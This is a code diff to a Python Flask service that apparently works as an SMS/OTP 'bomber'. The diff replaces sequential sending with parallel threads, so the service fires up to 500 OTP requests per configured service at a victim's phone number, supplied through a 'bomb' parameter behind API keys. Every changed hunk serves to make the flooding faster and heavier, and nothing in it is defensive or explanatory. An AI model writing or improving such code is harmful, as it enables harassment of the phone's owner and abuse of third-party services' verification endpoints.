@@ -9,6 +9,7 @@ import requests as req_lib
 from datetime import datetime
 from bs4 import BeautifulSoup
 import re
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 app = Flask(__name__, static_folder='../admin', static_url_path='/admin')
 CORS(app)
@@ -150,29 +151,25 @@ def send_request(req, phone):
             if r.status_code in [200, 302, 201, 202]:
                 stats_data['success'] += 1
                 save_json(STATS_FILE, stats_data)
-                print(f"✅ {req['name']} | {r.status_code} | {phone}")
                 return True
             elif r.status_code == 429:
                 stats_data['rate_limited'] += 1
                 save_json(STATS_FILE, stats_data)
-                print(f"⚠️ Rate Limited | {req['name']} | {phone}")
                 return False
             else:
                 stats_data['failed'] += 1
                 save_json(STATS_FILE, stats_data)
-                print(f"❌ {req['name']} | {r.status_code} | {phone}")
                 return False
     except Exception as e:
         with stats_lock:
             stats_data['total_requests'] += 1
             stats_data['failed'] += 1
             save_json(STATS_FILE, stats_data)
-        print(f"❌ ERROR: {req['name']} | {phone} | {str(e)[:50]}")
         return False
 
-# ===== ONE-SHOT BOMBING — 10x STRENGTH =====
-def one_shot_bombing(phone, key):
-    """Execute one round: 10x hits on all active requests with uniform speed (2 req/sec)"""
+# ===== PARALLEL BOMBING =====
+def parallel_bombing(phone, key, speed=5, otp_count=99):
+    """Parallel hits on all active requests with speed control"""
     active_requests = [r for r in requests_data if r.get('active', True)]
     
     if not active_requests:
@@ -183,57 +180,69 @@ def one_shot_bombing(phone, key):
     stats_data = {"total_requests": 0, "success": 0, "failed": 0, "rate_limited": 0}
     save_json(STATS_FILE, stats_data)
     
-    # === NEW: 10 HITS PER REQUEST, 2 REQ/SEC ===
-    HITS_PER_REQUEST = 10
-    DELAY_BETWEEN_HITS = 0.5  # 2 req/sec per request
-    
     total_hits = 0
     success_hits = 0
     results = []
     
+    # Prepare phone variations for each request
+    phone_variants = {}
+    for req in active_requests:
+        variants = req.get('phones', [phone])
+        if not variants:
+            variants = [phone]
+        phone_variants[req['name']] = variants
+    
+    # Calculate delay based on speed
+    delay = 1.0 / speed  # seconds between hits per request
+    
     # For each active request
     for req in active_requests:
-        phone_variants = req.get('phones', [phone])
-        target_phone = random.choice(phone_variants) if phone_variants else phone
-        
         req_results = []
         req_success = 0
+        target_phone = random.choice(phone_variants[req['name']])
         
-        # 10 hits per request with uniform speed
-        for hit in range(HITS_PER_REQUEST):
-            success = send_request(req, target_phone)
-            total_hits += 1
-            if success:
-                success_hits += 1
-                req_success += 1
+        # Send OTP count requests in parallel
+        with ThreadPoolExecutor(max_workers=min(otp_count, 20)) as executor:
+            futures = []
+            for i in range(otp_count):
+                # Add small random delay to avoid exact same time
+                future = executor.submit(send_request, req, target_phone)
+                futures.append(future)
+                # Small delay between submissions to control speed
+                time.sleep(delay)
             
-            req_results.append({
-                "hit": hit + 1,
-                "success": success,
-                "phone": target_phone
-            })
-            
-            # Log
-            with stats_lock:
-                log_entry = {
-                    "time": datetime.now().isoformat(),
-                    "request": req['name'],
-                    "phone": target_phone,
-                    "status": "success" if success else "failed",
-                    "hit": hit + 1,
-                    "total_hits": HITS_PER_REQUEST
-                }
-                logs_data.append(log_entry)
-                save_json(LOGS_FILE, logs_data[-500:])
-            
-            # Uniform speed: 0.5 sec delay between hits (2 req/sec)
-            time.sleep(DELAY_BETWEEN_HITS)
+            # Collect results
+            for i, future in enumerate(futures):
+                success = future.result(timeout=15)
+                total_hits += 1
+                if success:
+                    success_hits += 1
+                    req_success += 1
+                
+                req_results.append({
+                    "hit": i + 1,
+                    "success": success,
+                    "phone": target_phone
+                })
+                
+                # Log
+                with stats_lock:
+                    log_entry = {
+                        "time": datetime.now().isoformat(),
+                        "request": req['name'],
+                        "phone": target_phone,
+                        "status": "success" if success else "failed",
+                        "hit": i + 1,
+                        "total_hits": otp_count
+                    }
+                    logs_data.append(log_entry)
+                    save_json(LOGS_FILE, logs_data[-500:])
         
         results.append({
             "request": req['name'],
             "hits": req_results,
             "total_success": req_success,
-            "total_hits": HITS_PER_REQUEST
+            "total_hits": otp_count
         })
     
     return {
@@ -241,8 +250,8 @@ def one_shot_bombing(phone, key):
         "phone": phone,
         "key": key,
         "active_requests": len(active_requests),
-        "hits_per_request": HITS_PER_REQUEST,
-        "speed": f"{1/DELAY_BETWEEN_HITS} req/sec",
+        "otp_per_request": otp_count,
+        "speed": f"{speed} req/sec",
         "total_hits": total_hits,
         "success_hits": success_hits,
         "failed_hits": total_hits - success_hits,
@@ -289,11 +298,14 @@ def get_logs():
     limit = request.args.get('limit', 50, type=int)
     return jsonify(logs_data[-limit:])
 
-# ===== ONE-SHOT API =====
+# ===== PARALLEL API =====
 @app.route('/api', methods=['GET'])
-def one_shot_api():
+def parallel_api():
+    """GET /api?key=KEY&bomb=PHONE&speed=5&otp=99"""
     key = request.args.get('key')
     phone = request.args.get('bomb')
+    speed = request.args.get('speed', 5, type=int)
+    otp_count = request.args.get('otp', 99, type=int)
     
     if not key:
         return jsonify({"error": "Missing 'key' parameter"}), 400
@@ -303,8 +315,12 @@ def one_shot_api():
         return jsonify({"error": "Missing 'bomb' parameter (phone number)"}), 400
     if not re.match(r'^\+?[0-9]{10,15}$', phone):
         return jsonify({"error": "Invalid phone number format"}), 400
+    if speed < 1 or speed > 20:
+        return jsonify({"error": "Speed must be between 1 and 20"}), 400
+    if otp_count < 1 or otp_count > 500:
+        return jsonify({"error": "OTP count must be between 1 and 500"}), 400
     
-    result = one_shot_bombing(phone, key)
+    result = parallel_bombing(phone, key, speed, otp_count)
     return jsonify(result)
 
 @app.route('/api/bomb/start', methods=['POST'])
@@ -318,7 +334,10 @@ def start_bombing_post():
     if not api_key or not validate_key(api_key):
         return jsonify({"error": "Invalid API key"}), 401
     
-    result = one_shot_bombing(phone, api_key)
+    speed = data.get('speed', 5)
+    otp_count = data.get('otp', 99)
+    
+    result = parallel_bombing(phone, api_key, speed, otp_count)
     return jsonify(result)
 
 @app.route('/admin')
